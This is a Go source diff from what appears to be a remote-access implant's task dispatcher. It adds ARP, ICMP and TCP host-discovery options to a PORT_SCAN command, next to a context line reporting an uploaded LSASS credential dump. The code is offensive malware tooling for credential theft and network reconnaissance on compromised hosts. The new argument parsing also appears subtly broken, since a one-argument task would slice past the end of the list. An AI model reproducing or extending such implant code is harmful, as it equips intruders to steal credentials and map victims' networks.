@@ -692,32 +692,50 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, fmt.Sprintf("lsass dump uploaded (%d bytes)", len(data)), "")
 
 	case "PORT_SCAN":
-		// Args: "<target> [ports] [timeout_ms]"
-		// If ports is omitted or "-", runs host-discovery mode (ARP + TCP probe).
+		// Args: "<target> [ports|method] [timeout_ms]"
+		// Discovery methods: arp, icmp, tcp, auto (default: auto = ARP→ICMP→TCP)
+		// If second arg is a method keyword → host-discovery with that method.
+		// If second arg is port range → TCP port scan.
+		// If ports omitted or "-" → host-discovery (auto method).
 		parts := strings.Fields(task.Args)
 		if len(parts) < 1 {
-			t.sendResult(task.ID, "", "usage: PORT_SCAN <target> [ports] [timeout_ms]")
+			t.sendResult(task.ID, "", "usage: PORT_SCAN <target> [ports|arp|icmp|tcp] [timeout_ms]")
 			return
 		}
 		timeoutMs := 500
 		portArg := ""
-		if len(parts) >= 2 && parts[1] != "-" {
-			portArg = parts[1]
-		}
-		if len(parts) >= 3 {
-			if ms, err := strconv.Atoi(parts[2]); err == nil {
-				timeoutMs = ms
+		method := "auto"
+
+		discoverMethods := map[string]bool{"arp": true, "icmp": true, "tcp": true, "auto": true, "none": true}
+
+		if len(parts) >= 2 {
+			if discoverMethods[parts[1]] {
+				method = parts[1]
+				if method == "none" {
+					method = "auto"
+				}
+			} else if parts[1] != "-" {
+				portArg = parts[1]
 			}
-		} else if len(parts) == 2 {
-			// second arg might be timeout (all digits) when ports omitted
-			if ms, err := strconv.Atoi(parts[1]); err == nil {
+		}
+		// parse timeout from remaining args
+		for _, p := range parts[2:] {
+			if ms, err := strconv.Atoi(p); err == nil {
+				timeoutMs = ms
+				break
+			}
+		}
+		// if only two args and second is a number, treat as timeout
+		if len(parts) == 2 && portArg != "" {
+			if ms, err := strconv.Atoi(portArg); err == nil {
 				portArg = ""
 				timeoutMs = ms
 			}
 		}
+
 		if portArg == "" {
 			hosts := expandTargets(parts[0])
-			out := hostDiscover(hosts, timeoutMs)
+			out := hostDiscover(hosts, method, timeoutMs)
 			t.sendResult(task.ID, out, "")
 		} else {
 			out := portScan(parts[0], portArg, timeoutMs)
